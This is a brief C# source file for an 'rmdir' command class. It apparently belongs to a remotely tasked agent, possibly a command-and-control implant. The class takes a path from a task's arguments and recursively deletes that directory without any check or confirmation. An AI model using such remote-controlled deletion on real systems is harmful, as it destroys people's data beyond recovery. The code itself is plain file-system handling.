using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class DeleteDirectory : AgentCommand
    {
        public override string Name => "rmdir";

        public override string Execute(AgentTask task)
        {

            if (task.Args is null || task.Args.Length == 0)
            {
                return "No Path Provided";
            }
            var path = task.Args[0];
            Directory.Delete(path,true);
            if (!Directory.Exists(path))
                return $"{path} Deleted";
            return $"Failed to delete {path}";
        }
    }
}
